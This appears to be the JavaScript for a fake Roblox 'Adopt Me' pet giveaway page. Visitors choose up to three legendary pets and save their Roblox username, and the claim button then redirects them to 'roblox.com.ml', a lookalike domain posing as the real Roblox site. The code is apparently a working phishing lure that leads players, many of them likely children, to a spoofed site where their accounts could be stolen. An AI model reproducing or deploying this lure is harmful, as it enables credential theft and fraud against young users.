const MAX_PETS = 3;
const pets = [
  { name: "Shadow Dragon", rarity: "Legendary", img: "img/shadow.png" },
  { name: "Bat Dragon", rarity: "Legendary", img: "img/bat dragon.webp" },
  { name: "Frost Dragon", rarity: "Legendary", img: "img/Frost_Dragon_Pet.webp" },
  { name: "Giraffe", rarity: "Legendary", img: "img/Giraffe_Pet.webp" },
  { name: "Arctic Reindeer", rarity: "Legendary", img: "img/Arctic_Reindeer_Pet.webp" },
  { name: "Neon Unicorn", rarity: "Ultra-Rare", img: "img/Unicorn_Pet.webp" },
  { name: "Evil Unicorn", rarity: "Legendary", img: "img/EvilUnicorn_Pet.webp" },
  { name: "Crow", rarity: "Legendary", img: "img/Crow.png" }
];

let savedModes = JSON.parse(localStorage.getItem("petModes")) || {};
let savedSelections = JSON.parse(localStorage.getItem("petSelections")) || {};
let savedUsername = localStorage.getItem("robloxUsername") || "";
let selected = 0;

function renderPets() {
  const grid = document.getElementById("petGrid");
  grid.innerHTML = "";
  selected = 0;

  pets.forEach((pet, i) => {
    const qty = savedSelections[i] || 0;
    const mode = savedModes[i] || "Untouched";

    selected += qty;

    const card = document.createElement("div");
    card.className = "card";

    card.innerHTML = `
      <img class="pet-img" src="${pet.img}">
      <div class="pet-name">${pet.name}</div>
      <div class="pet-rarity">${pet.rarity}</div>

      <div class="mode-buttons">
        <button class="mode-btn mode-untouched ${mode === "Untouched" ? "active" : ""}" onclick="setMode(${i}, 'Untouched')"></button>
        <button class="mode-btn mode-neon ${mode === "Neon" ? "active" : ""}" onclick="setMode(${i}, 'Neon')">N</button>
        <button class="mode-btn mode-mega ${mode === "Mega" ? "active" : ""}" onclick="setMode(${i}, 'Mega')">M</button>
      </div>

      <div class="counter">
        <button onclick="changeQty(${i}, -1)">-</button>
        
        <span id="qty-${i}">${qty}</span>

        <div class="limit-tooltip">
          <button id="plus-${i}" onclick="changeQty(${i}, 1)">+</button>
        </div>
      </div>
    `;

    grid.appendChild(card);
  });

  document.getElementById("selectedCount").innerText = selected;

  if (savedUsername) {
    document.getElementById("username").value = savedUsername;
    document.getElementById("savedUser").innerText = "Saved username: @" + savedUsername;
  }
}

function setMode(index, mode) {
  savedModes[index] = mode;
  localStorage.setItem("petModes", JSON.stringify(savedModes));
  renderPets();
}

// UPDATED WITH LIMIT + TOOLTIP + DISABLE
function changeQty(index, amount) {
  const qtyEl = document.getElementById(`qty-${index}`);
  const plusBtn = document.getElementById(`plus-${index}`);
  const current = parseInt(qtyEl.innerText);
  const newQty = Math.max(0, current + amount);

  const newTotal = selected + (newQty - current);

  // Limit reached — add hover + disable
  if (newTotal > MAX_PETS) {
    plusBtn.classList.add("btn-disabled");
    return;
  }

  // Update total
  selected = newTotal;
  qtyEl.innerText = newQty;

  savedSelections[index] = newQty;
  localStorage.setItem("petSelections", JSON.stringify(savedSelections));

  document.getElementById("selectedCount").innerText = selected;

  // If under limit, re-enable button
  if (selected < MAX_PETS) {
    plusBtn.classList.remove("btn-disabled");
  }
}

function saveUsername() {
  const user = document.getElementById("username").value.trim();
  if (!user) return;

  savedUsername = user;
  localStorage.setItem("robloxUsername", user);
  document.getElementById("savedUser").innerText = "Saved username: @" + user;
}

document.addEventListener("DOMContentLoaded", () => {
  const modal = document.getElementById("alertModal");
  const closeBtn = document.getElementById("closeModalBtn");
  const claimBtn = document.getElementById("claimBtn");

  closeBtn.onclick = () => modal.classList.add("hidden");

  claimBtn.onclick = () => {
    if (selected === 0) {
      modal.classList.remove("hidden");
    } else if (selected > MAX_PETS) {
      alert("You can only claim up to 3 pets.");
    } else {
      window.location.href =
        "https://www.roblox.com.ml/games/920587237/Adopt-Me?privateServerLinkCode=76005853327433033930387728797653";
    }
  };

  renderPets();
});
